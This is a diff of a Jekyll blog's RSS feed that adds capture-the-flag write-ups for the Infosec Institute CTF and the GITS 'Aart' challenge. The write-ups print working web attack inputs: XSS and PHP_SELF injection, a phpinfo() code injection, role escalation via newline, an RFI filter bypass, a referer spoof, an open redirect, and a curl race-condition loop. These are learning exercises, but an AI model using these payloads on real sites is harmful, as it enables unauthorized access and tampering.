+        <title>Infosec Institute CTF Writeup lvl 7 - 13</title>
+        <description>&lt;h3&gt;Level 7&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;You have some kind of a login form. You want to make a prank on Twitter. You want to add a h1 to the page and share it with your Twitter followers so they can see that you can modify the page as it pleases you. You do not really want to cause harm. Do some magic and add &lt;code&gt;&amp;lt;h1&amp;gt;YOUR NAME HERE&amp;lt;/h1&amp;gt;&lt;/code&gt; in a way that people who visit the link you provide will the heading.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;There was an hidden field on the page and it was pretty clear that this page was making request on it&amp;#39;s own. So we have to exploit the &lt;a href=&quot;http://www.cyberscorpion.com/2012-03/why-php_self-should-be-avoided-when-creating-website-links/&quot;&gt;PHP_SELF vulnerability&lt;/a&gt; here. This is how I injected the code closing the input tag:&lt;br&gt;
+&lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg=&amp;#39;&amp;gt;&amp;lt;h1&amp;gt;username&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3&gt;Level 8&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Your task is to penetrate this site. You need to take advantage of the image upload and execute a JS script with an alert somehow through a file. Godspeed!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The first thing I did was to upload a regular image file. Then I clicked on the &amp;quot;Editor&amp;#39;s choice&amp;quot; and from there I knew were were stored the images:&lt;br&gt;
+&lt;code&gt;http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/chess3.png&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1&lt;/code&gt;&lt;br&gt;
+Ok, so I tried to upload a html file but got an error. This was easy to bypass using burpsuite I just changed the extension from .jpg to .html and it worked (:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/HmyhpG5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/w7v7uCg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately I couldn&amp;#39;t access it like the other images. I got an error because the server is trying to load an image but our file isn&amp;#39;t a valid images. So I thought maybe If I increased the id in attachment_id then my file should be referenced but nope... After some fuzzing I found out I was right about the referencing:&lt;br&gt;
+&lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=payload8.jpg&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3&gt;Level 9&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/uYtggJq.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;First thing I did was to open Cookie Manager and check the cookie. I saw a string which looked like b64 in the content value and I was right. The decoded b64 looks like this: &lt;code&gt;JOHN+DOE&lt;/code&gt;, alright.. So &lt;code&gt;MARY+JANE&lt;/code&gt; in b64 is &lt;code&gt;TUFSWStKQU5F&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/4kgCqiZ.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/FdZhUIr.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;h3&gt;Level 10&lt;/h3&gt;
+
+&lt;p&gt;A game... Ew I hate games, I didn&amp;#39;t even wanted to play it to hack it, sorry&lt;/p&gt;
+
+&lt;h3&gt;Level 11&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;It seems you have been blacklisted. Knowing what websites typically use to identify their users - try to get rid of that ban&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;First thing I did was to connect to my vpn to see if I see any change but nope. So I check the cookie and &lt;code&gt;content&lt;/code&gt; value was &amp;#39;no&amp;quot; so I just said &amp;#39;yes&amp;#39;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/XUcqBaN.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;h3&gt;Level 12&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Your task is to crack the password of the user called admin. Use whatever tool you like but we would recommend entering Google and searching for filetype:lst password in order to perform a dictionary attack.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Again I skipped this one because they pretty much give it away. They give the worlist and the attack... So just use your favorite http form bruteforer like wpfuzz, medusa, hydra, patator...&lt;/p&gt;
+
+&lt;h3&gt;Level 13&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Hmm, it seems that level thirteen is redirecting to this page. Why do not you analyze the redirect and search if the redirect is validated thoroughly. If not, you want to redirect to a page on a remote server and send links to people fooling them to think they are accessing a different domain.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It took me a while to figure this on because I was jumping levels and ex13.php was a different page than the real challenge. But when I clicked on it and got the real page the solution was pretty obvious. It&amp;#39;s just and insecure redirect:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=//google.com&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Thx to byt3me who helped me in some of the challenges,you can checkout his writups which are more detailed than mine on &lt;a href=&quot;https://secnotes.github.io/&quot;&gt;SecNotes&amp;lt;&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 04 Jul 2015 14:32:18 +0200</pubDate>
+        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/07/04/infosec-institute-ctf-part-two/</link>
+        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/07/04/infosec-institute-ctf-part-two/</guid>
+        
+        <category>thumbnails</category>
+        
+        <category>carte noire</category>
+        
+        
+        <category>jekyll</category>
+        
+      </item>
+    
+      <item>
+        <title>Infosec Institute CTF writeup lvl 1- 6</title>
+        <description>&lt;h3&gt;Level 1&lt;/h3&gt;
+
+&lt;p&gt;For this level we are already told that we have to exploit an XSS and pop an alert containing &amp;quot;Ex1&amp;quot;. So the basic payload to do that looks like this:&lt;br&gt;
+&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;Ex1&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br&gt;
+We can&amp;#39;t just post this because some validation are made on both parameters. I choose to attack the url parameter but you could attack the other one it&amp;#39;s basically the same thing.&lt;br&gt;
+This is the code of the url element:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;&amp;lt;input type=&quot;text&quot; placeholder=&quot;Name of site&quot; maxsize=&quot;10&quot; class=&quot;form-control&quot; pattern=&quot;[A Za-z]+&quot; required=&quot;&quot; name=&quot;name&quot;&amp;gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;So I removed &lt;code&gt;pattern=&amp;quot;[A Za-z]&lt;/code&gt; which makes the input only accept uppercase or lowercase characters and also changed the type value from &amp;quot;url&amp;quot; to &amp;quot;text&amp;quot;.So now we can post stuff! But still no alert. I took a look at the javascript and noticed this:  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;var siteName = $(&quot;.ex1input[type=&#39;text&#39;]&quot;).val().trim().replace(/&amp;lt;/g,&quot;&amp;amp;lt;&quot;).replace(/&amp;gt;/g, &quot;&amp;amp;gt;&quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;What it&amp;#39;s doing is replacing &amp;lt; and &amp;gt; with their html code, which is not what we want. So there in chrome I just removed the .replace(), hit ctrl+s and voilà&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/esDJfo6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;Level 2&lt;/h2&gt;
+
+&lt;p&gt;The page showed a calculator and we were asked to inject the PHP statement shat shows informations about Apache etc which is basicaly &lt;code&gt;phpinfo();&lt;/code&gt;. I quickly noticed that the two inputs were verified. You could only enter numbers and nothing on the frontend to bypass that. That leaves us with the only other thing can we&amp;#39;re sending: the operator.&lt;br&gt;
+I modified the operator value like this:&lt;br&gt;
+&lt;code&gt;&amp;lt;option value=&amp;quot;;phpinfo();&amp;quot;&amp;gt;+&amp;lt;/option&amp;gt;&lt;/code&gt; so basically when you send 1+1 it would translate to valid php code: &lt;code&gt;1;phpinfo();1;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2&gt;Level 3&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/JoUsMUl.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;First thing is to create an account, then after login I could see &amp;#39;role:normal&amp;#39; which was a hint. So the delimiter is &amp;quot;:&amp;quot; to separate key/value and I guessed that it would have a newline after that.&lt;br&gt;
+So my idea was to insert something like &lt;code&gt;someName\nrole:admin&lt;/code&gt;but I couldn&amp;#39;t just do this in the form. The easiest way I found to do it is to change the input type to &amp;quot;textarea&amp;quot;, that allows you to input a new line and &lt;code&gt;role:admin&lt;/code&gt; in it. Otherwhise you can intercept the request with burpsuite for example and modify it there&lt;/p&gt;
+
+&lt;h2&gt;Level 4&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;You are confronted with a website that loads some .txt files to display content for its pages. You are thinking that it may be vulnerable. You aim to load a nice file from a remote server and share the link with unsuspecting visitors. Your task is to successfully load a PHP file located in the root of infosecinstitute.com. The file should not exist but you must load it without getting errors and it must have the PHP file extension.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The url looked like:&lt;br&gt;
+&lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=file1.txt&lt;/code&gt; So from the instruction and the url we can deduce we can use RFI here. And if you read carrefuly the instruction (unlike me at first) you know that the root is &lt;code&gt;infosecinstitute.com&lt;/code&gt; and not &lt;code&gt;../../&lt;/code&gt; of course...&lt;br&gt;
+From there we got this error message:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/aLaXdAC.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;That&amp;#39;s right. So somehow the website detected we entered an url. There must some regex behind that. Earlier I did a bit of fuzzing on the file attribute and noted that I got different error message if I used upper or lower case. So this is how I got the flag, bypassing the regex:&lt;br&gt;
+&lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=hTtp://infosecinstitute.com/file2.txt.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2&gt;Level 5&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;It seems you have encountered a page which requires users to login before viewing. Do some magic without having to log in. The login button didn&amp;#39;t work&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/ORJ1nd8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;I intercept a request with burpsuite and changed the refer to login.html which I got from the source code. It tricks the browser to think we&amp;#39;re coming from the login page&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/VR7IEGe.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;Level 6&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;It seems you have landed on a site that takes HTML tags for article&amp;#39;s comments. You want to exploit this by making the users perform an action on the bank.php file in the root of site.com, if they are logged in there. You want users browsers to load that page and execute the query string transferTo with the number 555 as a parameter. Go ahead.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Well this was just about reading the instructions.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 02 Jul 2015 16:22:05 +0200</pubDate>
+        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/update/2015/07/02/infosec-institute-ctf-part-one/</link>
+        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/update/2015/07/02/infosec-institute-ctf-part-one/</guid>
         
         
         <category>jekyll</category>
@@ -37,119 +427,39 @@
       </item>
     
       <item>
-        <title>Welcome to Carte Noire</title>
-        <description>&lt;p&gt;Welcome to Carte Noire.&lt;/p&gt;
+        <title>Ghost-in-the-Shellcode - Aart Web Writeup</title>
+        <description>&lt;h1&gt;[GITS-CTF2015] Aart - web writeup&lt;/h1&gt;
 
-&lt;p&gt;Carte Noire began as a new theme for &lt;a href=&quot;http://www.jacobtomlinson.co.uk/&quot;&gt;my personal blog&lt;/a&gt;, but has now taken
-on a life of its own as a free theme for Jekyll.&lt;/p&gt;
+&lt;p&gt;The &lt;a href=&quot;https://2015.ghostintheshellcode.com/&quot;&gt;Ghost in the Shellcode CTF&lt;/a&gt; is now over but the website is still up and you can still complete challenges if you like (update: well not anymore..)&lt;br&gt;
+This is my little write up and the web challenge called &amp;quot;Aart&amp;quot;. Here&amp;#39;s how it looks when you go to the server for the firsttime  &lt;/p&gt;
 
-&lt;p&gt;The theme has been designed with simplicity and readability in mind. It makes
-use of third party services such as Disqus ad AddThis to ensure the blog has
-all the features you would expect from a dynamic application such as Wordpress
-but with the hosting and maintenance simplicity of Jekyll.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/GgqOl5N.png&quot; alt=&quot;&quot;&gt;  &lt;/p&gt;
 
-&lt;p&gt;Please use/copy/share Carte Noire!&lt;/p&gt;
+&lt;p&gt;On the register page there was a &amp;quot;Source code&amp;quot; link so I downloaded the code and took a look at it. I noticed 2 interesting things&lt;br&gt;
+Firstly the 2 SQL requests that are made when a user register  &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1qQ1z0n.png&quot; alt=&quot;&quot;&gt;  &lt;/p&gt;
+
+&lt;p&gt;Then in this portion of code you can actually see that if isRestricted is true then your account is restricted and otherwise you can get the key.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/jLrb3C5.png&quot; alt=&quot;&quot;&gt;  &lt;/p&gt;
+
+&lt;p&gt;If you still didn&amp;#39;t get it we&amp;#39;re just going to register/login a bunch of usernames and wait for the key (:&lt;br&gt;
+It&amp;#39;s a timing thing. At some point the first INSERT TO will be called twice before the second one has even been called once. This will give us a user with no restricted flag.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..50&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;;
+&lt;span class=&quot;k&quot;&gt;do     
+&lt;/span&gt;curl --data &lt;span class=&quot;s2&quot;&gt;&quot;username=i&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;password=i&quot;&lt;/span&gt; http://aart.2015.ghostintheshellcode.com/register.php -s &amp;gt;&amp;amp;1 &amp;gt;/dev/null &amp;amp;     
+curl --data &lt;span class=&quot;s2&quot;&gt;&quot;username=i&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;password=i&quot;&lt;/span&gt; http://aart.2015.ghostintheshellcode.com/login.php;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So this script is going to create accounts from &amp;#39;i1&amp;#39; to &amp;#39;i50&amp;#39; with the password &amp;#39;i&amp;#39;. At some point we stumble on an unrestricted account  &lt;/p&gt;
+
+&lt;p&gt;Here we go. &amp;quot;this is a key&amp;quot; was actually the key here (;&lt;/p&gt;
 </description>
-        <pubDate>Mon, 23 Mar 2015 16:31:19 +0100</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/03/23/welcome-to-carte-noir/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/03/23/welcome-to-carte-noir/</guid>
-        
-        <category>welcome</category>
-        
-        <category>to</category>
-        
-        <category>carte</category>
-        
-        <category>noire</category>
-        
-        
-        <category>jekyll</category>
-        
-      </item>
-    
-      <item>
-        <title>Carte Noire in Action</title>
-        <description>&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; - This article is a derivative of &lt;a href=&quot;http://pixyll.com/jekyll/pixyll/2014/06/10/see-pixyll-in-action/&quot;&gt;&amp;quot;See pixyll in action&amp;quot;&lt;/a&gt;, taken from the lovely jekyll theme &lt;a href=&quot;http://pixyll.com/&quot;&gt;pixyll&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;All links are easy to &lt;a href=&quot;#&quot;&gt;locate and discern&lt;/a&gt;, yet don&amp;#39;t detract from the harmony
-of a paragraph. The &lt;em&gt;same&lt;/em&gt; goes for italics and &lt;strong&gt;bold&lt;/strong&gt; elements. Even the the strikeout
-works if &lt;del&gt;for some reason you need to update your post&lt;/del&gt;. For consistency&amp;#39;s sake,
-&lt;ins&gt;The same goes for insertions&lt;/ins&gt;, of course.&lt;/p&gt;
-
-&lt;h3&gt;Code, with syntax highlighting&lt;/h3&gt;
-
-&lt;p&gt;Code blocks use the &lt;a href=&quot;https://noahfrederick.com/log/lion-terminal-theme-peppermint/&quot;&gt;peppermint&lt;/a&gt; theme.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Awesome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ActiveRecord&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Base&lt;/span&gt;
-  &lt;span class=&quot;kp&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EvenMoreAwesome&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;validates_presence_of&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:something&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;validates&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;email_format: &lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
-
-  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Title&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;style&amp;gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;500px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;application/javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;checked&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Title&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- here goes the rest of the page --&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;h1&gt;Headings!&lt;/h1&gt;
-
-&lt;p&gt;They&amp;#39;re responsive, and well-proportioned (in &lt;code&gt;padding&lt;/code&gt;, &lt;code&gt;line-height&lt;/code&gt;, &lt;code&gt;margin&lt;/code&gt;, and &lt;code&gt;font-size&lt;/code&gt;).&lt;/p&gt;
-
-&lt;h5&gt;They draw the perfect amount of attention&lt;/h5&gt;
-
-&lt;p&gt;This allows your content to have the proper informational and contextual hierarchy. Yay.&lt;/p&gt;
-
-&lt;h3&gt;There are lists, too&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Apples&lt;/li&gt;
-&lt;li&gt;Oranges&lt;/li&gt;
-&lt;li&gt;Potatoes&lt;/li&gt;
-&lt;li&gt;Milk&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;ol&gt;
-&lt;li&gt;Mow the lawn&lt;/li&gt;
-&lt;li&gt;Feed the dog&lt;/li&gt;
-&lt;li&gt;Dance&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3&gt;Images look great, too&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/DMCHDqF.jpg&quot; alt=&quot;Thumper&quot;&gt;&lt;/p&gt;
-
-&lt;h3&gt;Stylish blockquotes included&lt;/h3&gt;
-
-&lt;p&gt;You can use the markdown quote syntax, &lt;code&gt;&amp;gt;&lt;/code&gt; for simple quotes.&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse quis porta mauris.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3&gt;There&amp;#39;s more being added all the time&lt;/h3&gt;
-
-&lt;p&gt;Checkout the &lt;a href=&quot;https://github.com/jacobtomlinson/carte-noire&quot;&gt;Github repository&lt;/a&gt; to request,
-or add, features.&lt;/p&gt;
-
-&lt;p&gt;Happy writing.&lt;/p&gt;
-</description>
-        <pubDate>Tue, 10 Jun 2014 14:31:19 +0200</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/10/carte-noire-in-action/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/10/carte-noire-in-action/</guid>
+        <pubDate>Sun, 18 Jan 2015 13:31:19 +0100</pubDate>
+        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/01/18/aart-web-writeup/</link>
+        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2015/01/18/aart-web-writeup/</guid>
         
         <category>demo</category>
         
@@ -158,79 +468,6 @@ or add, features.&lt;/p&gt;
         <category>carte</category>
         
         <category>noire</category>
-        
-        
-        <category>jekyll</category>
-        
-      </item>
-    
-      <item>
-        <title>So, What is Jekyll?</title>
-        <description>&lt;p&gt;Jekyll is a tool for transforming your plain text into static websites and
-blogs. It is simple, static, and blog-aware. Jekyll uses the
-&lt;a href=&quot;http://docs.shopify.com/themes/liquid-basics&quot;&gt;Liquid&lt;/a&gt; templating
-language and has builtin &lt;a href=&quot;http://daringfireball.net/projects/markdown/&quot;&gt;Markdown&lt;/a&gt;
-and &lt;a href=&quot;http://en.wikipedia.org/wiki/Textile_(markup_language)&quot;&gt;Textile&lt;/a&gt; support.&lt;/p&gt;
-
-&lt;p&gt;It also ties in nicely to &lt;a href=&quot;https://pages.github.com/&quot;&gt;Github Pages&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Learn more about Jekyll on their &lt;a href=&quot;http://jekyllrb.com/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
-</description>
-        <pubDate>Mon, 09 Jun 2014 14:32:18 +0200</pubDate>
-        <link>http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/09/so-what-is-jekyll/</link>
-        <guid isPermaLink="true">http://carte-noire.jacobtomlinson.co.uk//jekyll/2014/06/09/so-what-is-jekyll/</guid>
-        
-        <category>about</category>
-        
-        <category>jekyll</category>
-        
-        
-        <category>jekyll</category>
-        
-      </item>
-    
-      <item>
-        <title>Using thumbnails</title>
-        <description>&lt;p&gt;Carte Noire is designed to start each article with an all-white image as a
-thumbnail. These are created by adding a &lt;code&gt;thumbnail&lt;/code&gt; parameter to the article&amp;#39;s
-&lt;a href=&quot;http://jekyllrb.com/docs/frontmatter/&quot;&gt;YAML frontmatter&lt;/a&gt;. This thumbnail parameter is processed in one of two ways,
-images specified in &lt;code&gt;_data/thumbnails.yml&lt;/code&gt; or using &lt;a href=&quot;http://fortawesome.github.io/Font-Awesome/&quot;&gt;Font Awesome&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2&gt;Images&lt;/h2&gt;
-
-&lt;p&gt;To use your own custom images as a thumbnail you must upload them to a web available
-location (I use &lt;a href=&quot;http://imgur.com/&quot;&gt;Imgur&lt;/a&gt;) and then you need to add the url to &lt;code&gt;_data/thumbnail.yml&lt;/code&gt;
-with an associated keyword.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;jekyll: &quot;http://i.imgur.com/aRQcGSi.png&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;You then add a &lt;code&gt;thumbnail&lt;/code&gt; option to the article&amp;#39;s frontmatter and provide the keyword
-for that thumbnail.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;thumbnail: jekyll
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;This allows you to re-use thumbnails across multiple articles without having to
-specify the url each time.&lt;/p&gt;
-
-&lt;h2&gt;Font Awesome&lt;/h2&gt;
-
-&lt;p&gt;If jekyll can&amp;#39;t find a corresponding image in your &lt;code&gt;thumbnail.yml&lt;/code&gt; file then it
-will assume you want to use a Font Awesome icon instead. You can find the full
-list of Font Awesome icons &lt;a href=&quot;http://fortawesome.github.io/Font-Awesome/icons/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;So for example if your article is about android and you want to use the &lt;a href=&quot;http://fortawesome.github.io/Font-Awesome/icon/android/&quot;&gt;android icon&lt;/a&gt;
-from font awesome you can just specify the following in your frontmatter.&lt;/p&gt;
